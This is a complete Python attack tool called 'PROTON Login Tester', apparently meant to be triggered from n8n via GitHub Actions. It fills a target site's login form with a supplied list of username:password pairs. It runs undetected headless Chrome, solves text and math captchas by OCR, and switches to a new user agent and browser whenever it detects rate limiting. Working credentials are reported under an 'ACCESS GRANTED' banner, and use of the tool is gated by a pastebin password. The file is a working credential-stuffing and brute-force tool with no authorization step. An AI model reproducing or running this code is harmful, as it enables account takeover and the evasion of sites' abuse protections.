#!/usr/bin/env python3
"""
PROTON Login Tester — GitHub Actions Edition
Triggered via repository_dispatch from n8n.
"""

import sys
import os
import time
import re
import base64
import json
import shutil
from urllib.parse import urlparse

# ============================================================
# ENVIRONMENT SETUP
# ============================================================

TARGET_URL = os.environ.get("TARGET_URL", "")
CREDS_B64 = os.environ.get("CREDS_B64", "")
RUN_ID = os.environ.get("RUN_ID", str(int(time.time())))

# ============================================================
# DEPENDENCY IMPORTS
# ============================================================

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
except ImportError:
    os.system(f"{sys.executable} -m pip install -q rich")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table

try:
    import undetected_chromedriver as uc
except ImportError:
    os.system(f"{sys.executable} -m pip install -q undetected-chromedriver")
    import undetected_chromedriver as uc

from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

try:
    from PIL import Image
    import pytesseract
    OCR_AVAILABLE = True
except ImportError:
    OCR_AVAILABLE = False

import requests

console = Console()

# ============================================================
# CONSTANTS
# ============================================================

PASSWORD_URL = "https://pastebin.com/raw/UB6ai6LW"

ERROR_WORDS = [
    'invalid', 'incorrect', 'wrong', 'failed', 'error', 'denied',
    'try again', 'no match', 'unauthorized', 'not found',
    'no such', 'does not exist', 'bad credential', 'bad password',
    'authentication failed', 'login failed', 'access denied',
    'username or password', 'user or password', 'wrong password',
    'wrong username', 'invalid user', 'invalid login', 'mismatch',
    'unrecognized', 'account not found', 'unable to log', 'could not log',
    'please try', 'check your', 'verify your', 'enter valid',
]

BLOCKED_WORDS = [
    'too many', 'rate limit', 'blocked', 'banned', 'suspicious',
    'verify you', 'unusual activity', 'temporarily blocked',
    'access restricted', 'slow down', 'try again later', 'wait',
    '429', 'abuse', 'bot detected', 'automated',
]

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
]

SUCCESS_WORDS = [
    'successfully', 'welcome', 'congratulations', 'logged in',
    'dashboard', 'log out', 'logout', 'sign out', 'signout',
    'my account', 'profile', 'home', 'portal',
]

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def ensure_scheme(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def is_valid_url(url):
    try:
        return all([urlparse(url).scheme, urlparse(url).netloc])
    except ValueError:
        return False


def read_creds_from_b64(b64_string):
    """Decode base64-encoded credentials (username:password per line)"""
    try:
        decoded = base64.b64decode(b64_string).decode("utf-8")
    except Exception:
        try:
            decoded = b64_string  # might already be plaintext
        except Exception:
            return None

    lines = decoded.strip().split("\n")
    return [l.strip() for l in lines if l.strip() and not l.strip().startswith("#")]


def parse_cred(cred):
    if ":" in cred:
        parts = cred.split(":", 1)
        return parts[0], parts[1]
    return cred, cred


def verify_tool_password():
    try:
        console.print("[bold cyan]🔍 Verifying tool password...[/]")
        response = requests.get(PASSWORD_URL, timeout=10)

        if response.status_code != 200:
            console.print("[bold red]❌ LAYER 1 FAILED: Server unreachable.[/]")
            return False
        console.print("[bold green]✅ LAYER 1 PASSED: Connection OK.[/]")

        password_text = response.text.strip()
        if not password_text:
            console.print("[bold red]❌ LAYER 2 FAILED: Password file empty.[/]")
            return False
        console.print("[bold green]✅ LAYER 2 PASSED: File exists.[/]")

        if password_text == "haxor unknone hart":
            console.print("[bold green]✅ LAYER 3 PASSED: Key matches.[/]")
            console.print(Panel("[bold bright_green]ACCESS GRANTED 🚀[/]",
                                border_style="bright_green", expand=False))
            return True
        else:
            console.print("[bold red]❌ LAYER 3 FAILED: Wrong password.[/]")
            return False
    except Exception as e:
        console.print(f"[bold red]❌ Authentication error: {e}[/]")
        return False


# ============================================================
# CHROME DRIVER
# ============================================================

def create_chrome_driver(user_agent_index=0):
    chrome_options = uc.ChromeOptions()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--window-size=1280,800")
    chrome_options.add_argument("--remote-debugging-port=9222")

    ua = USER_AGENTS[user_agent_index % len(USER_AGENTS)]
    chrome_options.add_argument(f"user-agent={ua}")

    console.print("[dim]🔄 Creating undetected Chrome driver...[/]")
    driver = uc.Chrome(options=chrome_options, version_main=0, use_subprocess=False)
    console.print(f"[dim]🌐 User-Agent: {ua[:60]}...[/]")
    return driver


# ============================================================
# LOGIN FIELD DETECTION
# ============================================================

def detect_login_fields_selenium(driver):
    result = {"username": None, "password": None, "submit": None,
              "isEmail": False, "isNumeric": False}

    try:
        password_fields = driver.find_elements(By.CSS_SELECTOR, 'input[type="password"]')
        if not password_fields:
            return result
        password_field = password_fields[0]

        all_inputs = driver.find_elements(By.TAG_NAME, "input")
        visible_inputs = [i for i in all_inputs
                          if i.is_displayed() and i.get_attribute("type") != "hidden"]

        USER_KW = ['user', 'email', 'login', 'name', 'account', 'phone', 'mobile', 'id', 'uname']
        EMAIL_KW = ['email', 'e-mail', 'mail']
        NUM_KW = ['phone', 'mobile', 'pin', 'number', 'otp', 'code']

        user_field = None

        for inp in visible_inputs:
            if inp == password_field:
                continue
            input_type = inp.get_attribute("type") or ""
            input_id = (inp.get_attribute("id") or "").lower()
            input_name = (inp.get_attribute("name") or "").lower()
            input_placeholder = (inp.get_attribute("placeholder") or "").lower()
            input_autocomplete = (inp.get_attribute("autocomplete") or "").lower()
            hay = f"{input_type} {input_id} {input_name} {input_placeholder} {input_autocomplete}"

            if any(kw in hay for kw in USER_KW):
                user_field = inp
                if any(kw in hay for kw in EMAIL_KW) or input_type == "email":
                    result["isEmail"] = True
                if any(kw in hay for kw in NUM_KW) or input_type in ["tel", "number"]:
                    result["isNumeric"] = True
                break

        if not user_field and password_field:
            try:
                siblings = driver.execute_script("""
                    const pw = arguments[0];
                    const all = pw.parentElement.querySelectorAll('input');
                    const idx = Array.from(all).indexOf(pw);
                    for (let i = idx - 1; i >= 0; i--) {
                        const t = (all[i].type || '').toLowerCase();
                        if (['text', 'email', 'tel', ''].includes(t) && all[i].offsetParent !== null) {
                            return all[i];
                        }
                    }
                    return null;
                """, password_field)
                if siblings:
                    user_field = siblings
            except:
                pass

        BTN_KW = ['login', 'log in', 'signin', 'sign in', 'submit', 'enter',
                  'next', 'ok', 'go', 'continue']
        submit_candidates = driver.find_elements(
            By.CSS_SELECTOR,
            'input[type="submit"], input[type="button"], button, a[role="button"], div[role="button"]'
        )

        submit_btn = None
        best_score = -1
        for btn in submit_candidates:
            if not btn.is_displayed():
                continue
            text = (btn.text or btn.get_attribute("value") or "").lower().strip()
            btn_id = (btn.get_attribute("id") or "").lower()
            btn_name = (btn.get_attribute("name") or "").lower()
            btn_type = (btn.get_attribute("type") or "").lower()

            score = 0
            if btn_type == "submit":
                score += 25
            if any(kw == text for kw in BTN_KW):
                score += 40
            if any(kw in btn_id for kw in BTN_KW):
                score += 30
            if any(kw in btn_name for kw in BTN_KW):
                score += 30
            if score > best_score:
                best_score = score
                submit_btn = btn

        if user_field:
            result["username"] = user_field
        result["password"] = password_field
        result["submit"] = submit_btn

    except Exception:
        pass

    return result


# ============================================================
# CAPTCHA DETECTION / SOLVING
# ============================================================

def detect_captcha_safe(driver):
    try:
        recaptcha_iframes = driver.find_elements(
            By.CSS_SELECTOR, 'iframe[src*="recaptcha"], iframe[src*="hcaptcha"]'
        )
        visible_frames = [f for f in recaptcha_iframes if f.is_displayed()]
        if visible_frames:
            return {"found": True, "type": "interactive"}

        captcha_inputs = driver.find_elements(
            By.CSS_SELECTOR,
            'input[name*="captcha" i], input[id*="captcha" i], input[placeholder*="captcha" i]'
        )
        for inp in captcha_inputs:
            if inp.is_displayed():
                if inp.get_attribute("value") and inp.get_attribute("value").strip():
                    continue
                try:
                    parent = inp.find_element(By.XPATH, "..")
                except:
                    parent = driver.find_element(By.TAG_NAME, "body")

                try:
                    img = parent.find_element(
                        By.CSS_SELECTOR,
                        'img[src*="captcha" i], img[alt*="captcha" i], img'
                    )
                    if img.is_displayed():
                        return {"found": True, "type": "text", "input": inp,
                                "image": img, "imageUrl": img.get_attribute("src")}
                except NoSuchElementException:
                    pass

                try:
                    parent_text = parent.text
                    math_match = re.search(
                        r'\[\s*(\d+\s*[+\-*/x]\s*\d+)\s*=\s*\]',
                        parent_text, re.IGNORECASE
                    )
                    if math_match:
                        return {"found": True, "type": "text", "input": inp,
                                "image": None, "imageUrl": None,
                                "mathText": math_match.group(1)}
                except:
                    pass
                return {"found": True, "type": "text", "input": inp}

        body_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        if any(kw in body_text for kw in ['enter captcha', 'solve captcha',
                                           'captcha code', 'verification code']):
            return {"found": True, "type": "unknown"}

        return {"found": False}
    except Exception:
        return {"found": False}


def solve_math_captcha(text):
    try:
        text = text.strip().replace('=', '').replace('?', '').strip()
        patterns = [
            (r'(\d+)\s*\+\s*(\d+)', '+'),
            (r'(\d+)\s*-\s*(\d+)', '-'),
            (r'(\d+)\s*\*\s*(\d+)', '*'),
            (r'(\d+)\s*x\s*(\d+)', 'x'),
            (r'(\d+)\s*/\s*(\d+)', '/'),
        ]
        for pattern, op in patterns:
            match = re.search(pattern, text)
            if match:
                n1, n2 = int(match.group(1)), int(match.group(2))
                if op in ['+']:
                    return str(n1 + n2)
                elif op in ['-']:
                    return str(n1 - n2)
                elif op in ['*', 'x']:
                    return str(n1 * n2)
                elif op in ['/']:
                    return str(n1 // n2) if n2 != 0 else None
        return None
    except:
        return None


def auto_solve_captcha_selenium(driver, captcha_info):
    if captcha_info.get("type") != "text":
        return False, "Not text"

    inp = captcha_info.get("input")
    if not inp:
        return False, "No input element"

    math_text = captcha_info.get("mathText")
    if not math_text:
        try:
            parent_text = driver.execute_script(
                "return arguments[0].closest('form, div, table, body').innerText", inp
            )
            math_match = re.search(
                r'\[\s*(\d+\s*[+\-*/x]\s*\d+)\s*=\s*\]',
                parent_text, re.IGNORECASE
            )
            if math_match:
                math_text = math_match.group(1)
        except:
            pass

    if math_text:
        solution = solve_math_captcha(math_text)
        if solution:
            try:
                inp.clear()
                inp.send_keys(solution)
                return True, f"Math Solved: {solution}"
            except Exception as e:
                return False, f"Fill failed: {e}"

    if not OCR_AVAILABLE:
        return False, "OCR unavailable"

    try:
        img = captcha_info.get("image")
        if not img:
            return False, "No image element"

        img.screenshot("captcha_temp.png")
        img_pil = Image.open("captcha_temp.png")
        captcha_text = pytesseract.image_to_string(img_pil, config='--psm 7').strip()

        solution = solve_math_captcha(captcha_text)
        if solution:
            inp.clear()
            inp.send_keys(solution)
            try:
                os.remove("captcha_temp.png")
            except:
                pass
            return True, f"OCR Math: {solution}"

        captcha_text = captcha_text.replace(' ', '').replace('O', '0') \
                                   .replace('l', '1').replace('I', '1')
        if len(captcha_text) >= 3:
            inp.clear()
            inp.send_keys(captcha_text)
            try:
                os.remove("captcha_temp.png")
            except:
                pass
            return True, f"OCR Text: {captcha_text}"

        try:
            os.remove("captcha_temp.png")
        except:
            pass
        return False, "Unsolved"
    except Exception as e:
        return False, f"Error: {e}"


# ============================================================
# LOGIN ATTEMPT
# ============================================================

def human_fill_selenium(element, text):
    try:
        element.clear()
        time.sleep(0.1)
        element.send_keys(text)
    except Exception:
        try:
            element.clear()
            element.send_keys(text)
        except:
            pass


def check_login_result_selenium(driver, original_url):
    time.sleep(3)

    try:
        body_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        page_title = driver.title.lower()
        current_url = driver.current_url.lower()
        combined_text = f"{body_text} {page_title} {current_url}"

        for word in BLOCKED_WORDS:
            if word in combined_text:
                return "BLOCKED", f"🚫 BLOCKED | Detected: \"{word}\""

        error_selectors = [
            ".field-validation-error", ".validation-summary-errors",
            ".alert-danger", ".alert-error", ".text-danger", ".text-error",
            "[class*='error-msg']", "[role='alert']", ".alert", ".message", ".msg"
        ]
        for sel in error_selectors:
            try:
                elements = driver.find_elements(By.CSS_SELECTOR, sel)
                for el in elements:
                    if el.is_displayed():
                        text = el.text.strip()
                        if any(w in text.lower() for w in ERROR_WORDS):
                            return False, f"❌ FAILED | {text[:100]}"
                        if any(w in text.lower() for w in SUCCESS_WORDS):
                            return True, f"✅ SUCCESS | {text[:100]}"
            except:
                pass

        for word in BLOCKED_WORDS:
            if word in body_text:
                return "BLOCKED", f"🚫 BLOCKED | \"{word}\" detected"

        for word in ERROR_WORDS:
            if word in body_text:
                return False, f"❌ FAILED | \"{word}\" detected"

        for word in SUCCESS_WORDS:
            if word in body_text or word in current_url:
                return True, f"✅ SUCCESS | \"{word}\" detected"

        orig_parsed = urlparse(original_url)
        final_parsed = urlparse(driver.current_url)

        if final_parsed.path != orig_parsed.path or final_parsed.netloc != orig_parsed.netloc:
            if len(body_text) > 20:
                return True, f"✅ SUCCESS | URL changed → {driver.current_url}"
            else:
                return False, "❌ FAILED | Blank page after redirect"

        try:
            if driver.find_elements(By.CSS_SELECTOR, 'input[type="password"]'):
                return False, "❌ FAILED | Still on login page"
        except:
            pass

        return False, "❌ FAILED | No success indicator"

    except Exception as e:
        return False, f"❌ FAILED | Error: {str(e)}"


def try_login_selenium(driver, username, password, fields, original_url):
    try:
        _ = driver.current_url
    except:
        return False, "❌ Page closed", fields

    if fields.get("username"):
        try:
            human_fill_selenium(fields["username"], username)
        except Exception as e:
            return False, "❌ Fill user failed", fields

    if fields.get("password"):
        try:
            human_fill_selenium(fields["password"], password)
        except Exception as e:
            return False, "❌ Fill pass failed", fields

    captcha_info = detect_captcha_safe(driver)
    if captcha_info.get("found"):
        console.print(f"   🔐 CAPTCHA detected (type: {captcha_info.get('type')})")
        if captcha_info.get("type") == "text":
            solved, msg = auto_solve_captcha_selenium(driver, captcha_info)
            if solved:
                console.print(f"   ✅ {msg}")
            else:
                console.print("   ⚠️  Auto-solve failed. Skipping...")
                return "SKIP", "CAPTCHA unsolvable", fields
        else:
            console.print("   💥 Interactive CAPTCHA - skipping")
            return "SKIP", "Interactive CAPTCHA", fields

    submit_btn = fields.get("submit")
    if submit_btn:
        try:
            submit_btn.click()
        except:
            try:
                driver.switch_to.active_element.send_keys(Keys.RETURN)
            except:
                pass
    else:
        try:
            driver.switch_to.active_element.send_keys(Keys.RETURN)
        except:
            pass

    success, message = check_login_result_selenium(driver, original_url)

    # Navigate back and re-detect fields
    try:
        driver.get(original_url)
        time.sleep(1.5)
        new_fields = detect_login_fields_selenium(driver)
        if new_fields.get("username") and new_fields.get("password"):
            fields = new_fields
    except:
        pass

    return success, message, fields


# ============================================================
# MAIN
# ============================================================

def browse(url, creds):
    url = ensure_scheme(url)
    if not is_valid_url(url):
        console.print(f"[bold red]❌ Invalid URL: {url}[/]")
        return

    console.print(Panel(f"[bold cyan]Target Acquired:[/] [bold white]{url}[/]",
                        border_style="cyan", expand=False))

    user_agent_index = 0

    # Create driver
    try:
        driver = create_chrome_driver(user_agent_index)
    except Exception as e:
        console.print(f"[bold red]❌ Failed to create driver: {e}[/]")
        return

    # Navigate
    try:
        driver.get(url)
        console.print(f"[bold green]✅ Loaded — Title:[/] [bold yellow]{driver.title}[/]")
    except Exception as e:
        console.print(f"[bold red]❌ Failed to load: {e}[/]")
        try:
            driver.quit()
        except:
            pass
        return

    time.sleep(1)

    # Detect login fields
    fields = detect_login_fields_selenium(driver)

    if not fields.get("username") or not fields.get("password"):
        console.print("[bold red]❌ Could not detect login fields.[/]")
        try:
            driver.quit()
        except:
            pass
        return

    table = Table(title="Detected Login Vectors",
                  show_header=True, header_style="bold magenta", border_style="red")
    table.add_column("Type", style="cyan", width=12)
    table.add_column("Info", style="green")

    u_info = fields["username"].get_attribute("id") or \
             fields["username"].get_attribute("name") or "detected"
    p_info = fields["password"].get_attribute("id") or \
             fields["password"].get_attribute("name") or "detected"
    s_info = "Will use Enter key"
    if fields.get("submit"):
        s_info = fields["submit"].get_attribute("id") or \
                 fields["submit"].get_attribute("innerText") or "button"

    table.add_row("Username", f"<input id='{u_info}'>")
    table.add_row("Password", f"<input id='{p_info}'>")
    table.add_row("Submit", s_info)
    console.print(table)

    is_email = fields.get("isEmail", False)
    is_numeric = fields.get("isNumeric", False)

    if is_numeric:
        console.print("[bold red]⚠️  DETECTED: Number/PIN-based login. Tool cannot handle.[/]")
        try:
            driver.quit()
        except:
            pass
        return

    if is_email:
        console.print("[bold cyan]📧 DETECTED: Email-based login. Auto-appending '@gmail.com'[/]")
    else:
        console.print("[bold cyan]👤 DETECTED: Username-based login[/]")

    if not creds:
        console.print("[bold red]⚠️  No credentials loaded.[/]")
        try:
            driver.quit()
        except:
            pass
        return

    total = len(creds)
    console.print(Panel(f"[bold bright_green]🚀 {total} credential(s) loaded — Initiating Brute Force[/]",
                        border_style="bright_green", expand=False))

    try:
        for idx, cred in enumerate(creds, 1):
            username, password = parse_cred(cred)
            if is_email and '@' not in username:
                username += '@gmail.com'

            console.print(f"\n[bold white][{idx}/{total}] Trying:[/] "
                          f"[bold cyan]{username}[/] : [bold cyan]{password}[/]")

            # Check if browser is still alive
            try:
                _ = driver.current_url
            except:
                console.print("[bold yellow]⚠️ Browser closed. Reopening...[/]")
                try:
                    driver.quit()
                except:
                    pass
                try:
                    driver = create_chrome_driver(user_agent_index)
                except:
                    console.print("[bold red]❌ Could not recreate driver. Stopping.[/]")
                    return
                try:
                    driver.get(url)
                    time.sleep(1.5)
                    fields = detect_login_fields_selenium(driver)
                    if not fields.get("username"):
                        continue
                except:
                    continue

            success, message, fields = try_login_selenium(driver, username, password, fields, url)

            if success == "SKIP":
                console.print(f"[bold yellow]⏭️  {message}[/]")
                continue
            elif success is True:
                console.print(f"[bold bright_green]{message}[/]")
            elif success == "BLOCKED":
                console.print(f"[bold bright_red]{message}[/]")
            else:
                console.print(f"[dim red]{message}[/]")

            if success == "BLOCKED":
                console.print(Panel("[bold red]🚫 RATE LIMITED / BLOCKED! Changing Identity...[/]",
                                    border_style="red", expand=False))
                try:
                    driver.quit()
                except:
                    pass

                time.sleep(3)
                user_agent_index += 1
                try:
                    driver = create_chrome_driver(user_agent_index)
                except:
                    console.print("[bold red]❌ Could not create new driver. Stopping.[/]")
                    return

                try:
                    driver.get(url)
                    time.sleep(2)
                    fields = detect_login_fields_selenium(driver)
                    if not fields.get("username"):
                        console.print("[bold red]❌ Could not detect login fields after reload.[/]")
                        break
                    console.print("[bold green]✅ Fresh browser ready. Continuing...[/]")
                    continue
                except Exception as e:
                    console.print(f"[bold red]❌ Failed to reload: {e}[/]")
                    break

            if success is True:
                console.print(Panel.fit(
                    f"[bold bright_green]🔥 CREDENTIAL WORKS! 🔥[/]\n\n"
                    f"[bold yellow]{username} : {password}[/]",
                    border_style="bright_green",
                    title="ACCESS GRANTED",
                    padding=(1, 4)
                ))
                if idx < total:
                    # In CI mode, auto-continue (no interactive prompt)
                    console.print("[bold cyan]➡️  Continuing to next...[/]")
                else:
                    console.print("[bold green]🏁 All done.[/]")
                    break
        else:
            console.print(f"\n[bold red]🏁 All {total} tried. None worked.[/]")

    except KeyboardInterrupt:
        console.print("\n[bold bright_red]💥 INTERRUPTED![/]")

    try:
        driver.quit()
    except:
        pass

    console.print("[bold bright_magenta]✅ Operation Complete.[/]")


if __name__ == "__main__":
    console.print("=" * 60)
    console.print("🚀 PROTON — GitHub Actions Edition")
    console.print("=" * 60)

    if not TARGET_URL:
        console.print("[bold red]❌ No TARGET_URL provided via environment.[/]")
        console.print("[bold yellow]   Set via n8n payload: target_url[/]")
        sys.exit(1)

    if not CREDS_B64:
        console.print("[bold red]❌ No CREDS_B64 provided via environment.[/]")
        console.print("[bold yellow]   Set via n8n payload: creds_b64 (base64)[/]")
        sys.exit(1)

    # Verify tool password
    if not verify_tool_password():
        console.print("[bold red]❌ Authentication failed. Exiting.[/]")
        sys.exit(1)

    creds = read_creds_from_b64(CREDS_B64)
    if not creds:
        console.print("[bold red]❌ No valid credentials found in payload.[/]")
        sys.exit(1)

    console.print(f"[bold green]✅ Loaded {len(creds)} credentials.[/]")
    time.sleep(1)
    browse(TARGET_URL, creds=creds)
